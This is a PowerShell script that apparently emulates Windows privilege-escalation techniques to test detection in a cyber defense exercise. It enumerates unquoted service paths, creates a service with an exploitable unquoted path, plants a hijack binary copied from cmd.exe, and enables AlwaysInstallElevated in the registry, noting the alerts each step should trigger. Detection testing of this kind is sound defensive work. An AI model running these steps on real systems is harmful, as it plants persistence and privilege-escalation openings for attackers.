Write-Host "[1] enumerating unquoted-path vulnerable services..."
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and
  ($_.PathName -split ' ')[0] -notmatch '\\Windows\\' } |
  Select-Object Name, PathName | Format-Table -AutoSize
Write-Host "[2] planting the vulnerable service (expect EVT-7045 + PERS-SERVICE)..."
sc.exe create CCDCUnq binPath= "C:\Users\Public\My Tools\svc.exe" start= auto | Out-Null
Write-Host "[3] planting the hijack binary (expect SIG-* on write)..."
if (Test-Path C:\Users\Public\sysupd.exe) { Copy-Item C:\Users\Public\sysupd.exe C:\Users\Public\My.exe }
else { Copy-Item C:\Windows\System32\cmd.exe C:\Users\Public\My.exe }
Write-Host "[4] setting AlwaysInstallElevated (currently a GAP)..."
New-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Force | Out-Null
New-Item HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Force | Out-Null
New-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -Value 1 -PropertyType DWord -Force | Out-Null
Write-Host "cleanup: sc delete CCDCUnq; Remove-Item C:\Users\Public\My.exe; remove both AlwaysInstallElevated values"
